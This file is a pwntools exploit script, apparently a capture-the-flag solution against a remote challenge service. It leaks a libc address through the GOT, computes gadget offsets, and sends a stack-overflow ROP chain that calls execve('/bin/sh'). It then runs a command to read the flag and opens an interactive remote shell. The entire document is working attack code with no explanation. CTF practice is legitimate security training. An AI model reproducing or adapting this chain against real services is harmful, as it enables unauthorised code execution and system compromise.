from pwn import *
context.log_level = 'DEBUG'
host = 'isc.taiwan-te.ch'
port = 10006

r = remote(host, port)

put_got_addr = 0x601018
put_offset = 0x809c0

r.recvuntil('hex: ')
r.send(hex(put_got_addr))

r.recvuntil('Content: ')
put_addr = int(r.recvuntil('\n')[:-1])

libc_base = put_addr - put_offset

bin_sh = 0x1b3e9a
pop_rdi = 0x2155f
pop_rsi = 0x23e6a
pop_rdx = 0x1b96
pop_rax = 0x439c8
syscall = 0xd2975

p = 'a' * 0x38
p += p64(libc_base + pop_rdi)
p += p64(libc_base + bin_sh)
p += p64(libc_base + pop_rsi)
p += p64(0)
p += p64(libc_base + pop_rdx)
p += p64(0)
p += p64(libc_base + pop_rax)
p += p64(0x3b)
p += p64(libc_base + syscall)
'''
one = 0x4f322
p = 'a' * 0x38
p += p64(libc_base + one)
'''
r.recvuntil('messege: ')
r.send(p)

r.sendline('cat /home/`whoami`/flag')

r.interactive()
